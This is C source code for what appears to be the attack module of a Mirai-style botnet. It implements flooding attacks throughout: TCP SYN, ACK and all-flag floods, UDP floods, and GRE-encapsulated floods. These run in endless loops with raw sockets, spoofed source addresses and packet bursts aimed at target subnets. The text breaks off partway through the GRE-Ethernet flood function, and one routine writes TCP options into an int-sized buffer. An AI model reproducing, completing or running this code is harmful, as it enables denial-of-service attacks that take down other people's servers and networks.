#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

#define SNDBUF_MAX (16 * 1024 * 1024)

#define RAW_TCP() do { \
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); \
    if (fd == -1) fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); \
    if (fd == -1) return; \
    i = 1; if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) { close(fd); return; } \
    i = SNDBUF_MAX; setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i)); \
} while(0)

#define RAW_GRE() do { \
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); \
    if (fd == -1) return; \
    i = 1; if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) { close(fd); return; } \
    i = SNDBUF_MAX; setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i)); \
} while(0)

static void build_tcp_opts(uint8_t *o, uint32_t tsval, uint32_t tsecr, uint16_t mss, uint8_t wscale, int *len)
{
    int off = 0;
    o[off++] = 2; o[off++] = 4; *((uint16_t *)(o + off)) = htons(mss); off += 2;
    o[off++] = 1; o[off++] = 3; o[off++] = 3; o[off++] = wscale;
    o[off++] = 1; o[off++] = 4; o[off++] = 2;
    o[off++] = 8; o[off++] = 10; *((uint32_t *)(o + off)) = htonl(tsval); off += 4;
    *((uint32_t *)(o + off)) = htonl(tsecr); off += 4;
    while (off % 4 != 0) o[off++] = 1;
    *len = off;
}

static void attack_method_observer_impl(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);

static void set_tcp_flags(struct tcphdr *tcph, int method)
{
    tcph->syn = tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 0;
    switch (method) {
        case 0: tcph->syn = 1; break;
        case 1: tcph->ack = 1; break;
        case 2: tcph->psh = 1; tcph->ack = 1; break;
        case 3: tcph->fin = 1; tcph->ack = 1; break;
        case 4: tcph->rst = 1; break;
        case 5: tcph->urg = 1; tcph->psh = 1; break;
        case 6: tcph->syn = tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 1; break;
        case 7: tcph->fin = tcph->psh = tcph->urg = 1; break;
        default: tcph->syn = 1; break;
    }
}


void attack_method_nfolag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, mode, burst, data_len, opt_len, tcp_len, total;
    uint8_t ip_tos, ip_ttl, dont_frag, spoof_src;
    uint16_t sport, dport;
    struct iphdr *iph;
    struct tcphdr *tcph;
    uint8_t *optp;
    char *pl;
    uint8_t packet[2048];
    struct sockaddr_in dst;
    uint32_t src_ip;

    mode = attack_get_opt_int(opts_len, opts, ATK_OPT_USYN, 0);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 4);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 1);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    spoof_src = (attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0) == 0xffffffff) ? 1 : 0;
    if (burst < 4) burst = 4;
    if (burst > 256) burst = 256;
    if (data_len > 512) data_len = 512;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) { close(fd); return; }
    i = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    dst.sin_family = AF_INET;
    dst.sin_port = htons(dport);

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            iph = (struct iphdr *)packet;
            tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
            optp = (uint8_t *)(tcph + 1);
            pl = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr) + 64);

            uint32_t target = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            dst.sin_addr.s_addr = target;

            src_ip = spoof_src ? rand_next() : (LOCAL_ADDR ? LOCAL_ADDR : util_local_addr());
            if (!src_ip) src_ip = rand_next();

            if (mode == 0) {
                build_tcp_opts(optp, rand_next(), 0, 1400 + (rand_next() & 0x0f), 6, &opt_len);
                tcp_len = sizeof(struct tcphdr) + opt_len;
            } else {
                tcp_len = sizeof(struct tcphdr);
            }
            total = sizeof(struct iphdr) + tcp_len + data_len;
            if (total > (int)sizeof(packet)) total = sizeof(struct iphdr) + tcp_len;

            iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
            iph->tot_len = htons(total); iph->id = htons(rand_next() & 0xffff);
            iph->ttl = ip_ttl; iph->protocol = IPPROTO_TCP;
            iph->frag_off = dont_frag ? htons(1 << 14) : 0;
            iph->saddr = src_ip; iph->daddr = target;
            tcph->source = htons((sport == 0xFFFF) ? (rand_next() % 60000 + 1024) : sport);
            tcph->dest = htons((dport == 0xFFFF) ? (rand_next() % 60000 + 1024) : dport);
            tcph->seq = htonl(rand_next()); tcph->ack_seq = 0;
            tcph->doff = tcp_len / 4; tcph->res1 = 0;
            tcph->syn = 1; tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 0;
            tcph->window = htons(65535); tcph->urg_ptr = 0;
            if (data_len > 0) {
                int n = data_len > 512 ? 512 : data_len;
                for (int k = 0; k < n; k++) pl[k] = (k % 94) + 33;
            }
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0; tcph->check = checksum_tcpudp(iph, tcph, htons(tcp_len + data_len), tcp_len + data_len);
            for (int b = 0; b < burst; b++)
                sendto(fd, packet, total, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
        }
    }
}

void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    if (attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, NULL) != NULL) {
        attack_method_observer_impl(targs_len, targs, opts_len, opts);
        return;
    }
    attack_method_nfolag(targs_len, targs, opts_len, opts);
}

void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char mval[2] = {'1',0};
    struct attack_option *nopts = calloc(opts_len + 1, sizeof(struct attack_option));
    if (!nopts) return;
    nopts[0].key = ATK_OPT_METHOD; nopts[0].val = mval;
    if (opts_len) memcpy(nopts + 1, opts, opts_len * sizeof(struct attack_option));
    attack_method_observer_impl(targs_len, targs, opts_len + 1, nopts);
    free(nopts);
}

static void attack_method_observer_impl(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    uint8_t ip_tos, ip_ttl, dont_frag;
    uint16_t ip_ident;
    int method, payload_size;
    BOOL payload_random, urg_fl, ack_fl, psh_fl, rst_fl, syn_fl, fin_fl;
    uint32_t local_addr;
    char *packet;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *payload;
    struct sockaddr_in target_sock;

    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 0);
    method = attack_get_opt_int(opts_len, opts, ATK_OPT_METHOD, 0);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 128) burst = 128;
    payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    payload_random = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, 0);
    ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 0);
    psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, 0);
    rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, 0);
    syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, 0);
    fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, 0);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) { close(fd); return; }
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    local_addr = LOCAL_ADDR ? LOCAL_ADDR : util_local_addr();
    if (!local_addr) { close(fd); return; }

    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet = malloc(pkt_size);
    if (!packet) { close(fd); return; }
    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    payload = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(iph, 0, sizeof(struct iphdr));
    memset(tcph, 0, sizeof(struct tcphdr));
    iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
    iph->tot_len = htons(pkt_size);
    iph->id = (ip_ident == 0xFFFF) ? htons(rand_next() & 0xFFFF) : htons(ip_ident);
    iph->ttl = ip_ttl;
    if (dont_frag) iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = local_addr;
    tcph->source = htons(rand_next() % 60000 + 1024);
    tcph->doff = 5; tcph->window = htons(65535);
    set_tcp_flags(tcph, method);
    if (urg_fl) tcph->urg = 1;
    if (ack_fl) tcph->ack = 1;
    if (psh_fl) tcph->psh = 1;
    if (rst_fl) tcph->rst = 1;
    if (syn_fl) tcph->syn = 1;
    if (fin_fl) tcph->fin = 1;
    if (payload_random) rand_str(payload, payload_size);
    else memset(payload, 0, payload_size);

    target_sock.sin_family = AF_INET;
    target_sock.sin_port = htons(attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80));

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            uint32_t target_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            iph->daddr = target_addr;
            tcph->dest = htons(attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80));
            if (ip_ident == 0xFFFF) iph->id = htons(rand_next() & 0xFFFF);
            tcph->source = htons(rand_next() % 60000 + 1024);
            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());
            if (payload_random) rand_str(payload, payload_size);
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0; tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_size), sizeof(struct tcphdr) + payload_size);
            target_sock.sin_addr.s_addr = target_addr;
            for (int b = 0; b < burst; b++)
                sendto(fd, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&target_sock, sizeof(target_sock));
        }
    }
}


void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, sock, burst;
    uint16_t sport, dport, data_len;
    BOOL data_random;
    struct sockaddr_in bind_a, target;
    char *data;

    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    data_random = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 128) burst = 128;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    i = SNDBUF_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
    bind_a.sin_family = AF_INET;
    bind_a.sin_addr.s_addr = 0;
    bind_a.sin_port = (sport == 0xFFFF) ? htons(rand_next() % 60000 + 1024) : htons(sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    target.sin_family = AF_INET;
    target.sin_port = htons((dport == 0xFFFF) ? 80 : dport);
    data = malloc(data_len);
    if (!data) { close(sock); return; }

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            target.sin_addr.s_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            if (data_random) rand_str(data, data_len);
            for (int b = 0; b < burst; b++)
                sendto(sock, data, data_len, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
        }
    }
}

void attack_method_cudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    attack_method_udpplain(targs_len, targs, opts_len, opts);
}

void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    attack_method_udpplain(targs_len, targs, opts_len, opts);
}

void attack_method_tcpusyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_option single[2];
    char mval[2] = {'1',0};
    single[0].key = ATK_OPT_USYN; single[0].val = mval;
    attack_method_nfolag(targs_len, targs, 1, single);
}

void attack_method_asyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char mval[2] = {'0',0};
    struct attack_option *nopts;
    uint8_t nlen;
    int j, found = 0;
    for (j = 0; j < opts_len && opts; j++)
        if (opts[j].key == ATK_OPT_USYN) { opts[j].val = mval; found = 1; break; }
    if (found) {
        attack_method_nfolag(targs_len, targs, opts_len, opts);
        return;
    }
    nopts = calloc(opts_len + 1, sizeof(struct attack_option));
    if (!nopts) return;
    if (opts_len) memcpy(nopts, opts, opts_len * sizeof(struct attack_option));
    nopts[opts_len].key = ATK_OPT_USYN; nopts[opts_len].val = mval;
    nlen = opts_len + 1;
    attack_method_nfolag(targs_len, targs, nlen, nopts);
    free(nopts);
}

void attack_method_tcpall(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_option *nopts;
    uint8_t nlen;
    char mval[2] = {'6',0};
    if (opts_len && attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, NULL)) {
        attack_method_observer_impl(targs_len, targs, opts_len, opts);
        return;
    }
    nopts = calloc(opts_len + 1, sizeof(struct attack_option));
    if (!nopts) return;
    if (opts_len) memcpy(nopts, opts, opts_len * sizeof(struct attack_option));
    nopts[opts_len].key = ATK_OPT_METHOD; nopts[opts_len].val = mval;
    nlen = opts_len + 1;
    attack_method_observer_impl(targs_len, targs, nlen, nopts);
    free(nopts);
}

void attack_method_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_option *nopts;
    uint8_t nlen;
    char mval[2] = {'7',0};
    nopts = calloc(opts_len + 1, sizeof(struct attack_option));
    if (!nopts) return;
    if (opts_len) memcpy(nopts, opts, opts_len * sizeof(struct attack_option));
    nopts[opts_len].key = ATK_OPT_METHOD; nopts[opts_len].val = mval;
    nlen = opts_len + 1;
    attack_method_observer_impl(targs_len, targs, nlen, nopts);
    free(nopts);
}

void attack_method_udpgame(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    attack_method_udpplain(targs_len, targs, opts_len, opts);
}


void attack_method_mptcpgre(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst, data_len, opt_len, tcp_len, total;
    uint8_t ip_tos, ip_ttl, dont_frag, spoof_src;
    uint16_t sport, dport;
    struct iphdr *iph;
    struct tcphdr *tcph;
    uint8_t *optp;
    char *pl;
    uint8_t packet[2048];
    struct sockaddr_in dst;
    uint32_t src_ip;

    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 64);
    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 1);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    spoof_src = (attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0) == 0xffffffff) ? 1 : 0;
    if (burst < 8) burst = 8;
    if (burst > 256) burst = 256;
    if (data_len > 512) data_len = 512;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) { close(fd); return; }
    i = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    build_tcp_opts((uint8_t *)&i, rand_next(), 0, 1400, 6, &opt_len);
    tcp_len = sizeof(struct tcphdr) + opt_len;
    total = sizeof(struct iphdr) + tcp_len + data_len;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(dport);

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            iph = (struct iphdr *)packet;
            tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
            optp = (uint8_t *)(tcph + 1);
            pl = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr) + 64);

            uint32_t target = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            dst.sin_addr.s_addr = target;
            src_ip = spoof_src ? rand_next() : (LOCAL_ADDR ? LOCAL_ADDR : util_local_addr());
            if (!src_ip) src_ip = rand_next();

            build_tcp_opts(optp, rand_next(), 0, 1400 + (rand_next() & 0x0f), 6, &opt_len);
            if (total > (int)sizeof(packet)) total = sizeof(struct iphdr) + tcp_len + data_len;

            iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
            iph->tot_len = htons(total); iph->id = htons(rand_next() & 0xffff);
            iph->ttl = ip_ttl; iph->protocol = IPPROTO_TCP;
            iph->frag_off = dont_frag ? htons(1 << 14) : 0;
            iph->saddr = src_ip; iph->daddr = target;
            tcph->source = htons((sport == 0xFFFF) ? (rand_next() % 60000 + 1024) : sport);
            tcph->dest = htons((dport == 0xFFFF) ? (rand_next() % 60000 + 1024) : dport);
            tcph->seq = htonl(rand_next()); tcph->ack_seq = 0;
            tcph->doff = tcp_len / 4; tcph->res1 = 0;
            tcph->syn = 1; tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 0;
            tcph->window = htons(65535); tcph->urg_ptr = 0;
            if (data_len > 0) {
                int n = data_len > 512 ? 512 : data_len;
                for (int k = 0; k < n; k++) pl[k] = (k % 94) + 33;
            }
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0; tcph->check = checksum_tcpudp(iph, tcph, htons(tcp_len + data_len), tcp_len + data_len);
            for (int b = 0; b < burst; b++)
                sendto(fd, packet, total, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
        }
    }
}


void attack_method_orbitv3(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 4);
    if (burst < 4) burst = 4;
    struct attack_option *nopts;
    uint8_t nlen = opts_len + 1;
    char bval[8];
    util_itoa(burst, 10, bval);
    nopts = calloc(nlen, sizeof(struct attack_option));
    if (!nopts) return;
    if (opts_len) memcpy(nopts, opts, opts_len * sizeof(struct attack_option));
    nopts[opts_len].key = ATK_OPT_BURST; nopts[opts_len].val = bval;
    attack_method_mptcpgre(targs_len, targs, nlen, nopts);
    free(nopts);
}


void attack_method_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos, ip_ttl;
    uint16_t sport, dport;
    uint32_t local;
    struct sockaddr_in dst_sa;
    char pkt[128];
    struct iphdr *iph;
    struct tcphdr *tcph;

    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    local = util_local_addr();
    if (!local) local = LOCAL_ADDR;
    if (!local) return;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0) { close(fd); return; }
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    int pool_size = 16;
    uint32_t *seq_pool = calloc(pool_size * targs_len, sizeof(uint32_t));
    if (!seq_pool) { close(fd); return; }
    for (i = 0; i < pool_size * targs_len; i++) seq_pool[i] = rand_next();

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            ipv4_t dst = targs[i].netmask < 32 ? htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
            int idx = rand_next() % pool_size;
            uint32_t seq = seq_pool[i * pool_size + idx];
            iph = (struct iphdr *)pkt;
            tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
            uint16_t sp = (sport == 0xffff) ? (rand_next() % 60000 + 1024) : sport;
            uint16_t dp = (dport == 0xffff) ? 80 : dport;
            iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand_next() & 0xffff); iph->frag_off = htons(0x4000);
            iph->ttl = ip_ttl; iph->protocol = IPPROTO_TCP; iph->check = 0;
            iph->saddr = local; iph->daddr = dst;
            tcph->source = htons(sp); tcph->dest = htons(dp);
            tcph->seq = htonl(seq); tcph->ack_seq = 0; tcph->doff = 5;
            tcph->syn = 1; tcph->ack = tcph->psh = tcph->rst = tcph->fin = tcph->urg = 0;
            tcph->window = htons(65535); tcph->check = 0; tcph->urg_ptr = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
            dst_sa.sin_family = AF_INET; dst_sa.sin_addr.s_addr = dst; dst_sa.sin_port = htons(dp);
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&dst_sa, sizeof(dst_sa));
            seq_pool[i * pool_size + idx] = seq + 65;
        }
    }
}


void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    if (burst < 4) burst = 4;
    if (burst > 64) burst = 64;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1) { close(fd); return; }
    i = SNDBUF_MAX;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    for (i = 0; i < targs_len; i++) {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, 1);
        iph = (struct iphdr *)pkts[i];
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag) iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        greh->opts = 0; greh->protocol = htons(ETH_P_IP);
        greiph->version = 4; greiph->ihl = 5; greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag) greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        greiph->daddr = gcip ? targs[i].addr : rand_next();
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff) iph->saddr = rand_next();
            if (ip_ident == 0xffff) {
                iph->id = htons(rand_next() & 0xffff);
                greiph->id = htons(~(ntohs(iph->id) - 1000));
            }
            if (sport == 0xffff) udph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff) udph->dest = htons(rand_next() & 0xffff);
            if (!gcip) greiph->daddr = rand_next();
            else greiph->daddr = iph->daddr;
            if (data_rand) rand_str(data, data_len);
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            greiph->check = 0; greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
            udph->check = 0; udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            for (int b = 0; b < burst; b++)
                sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}


void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
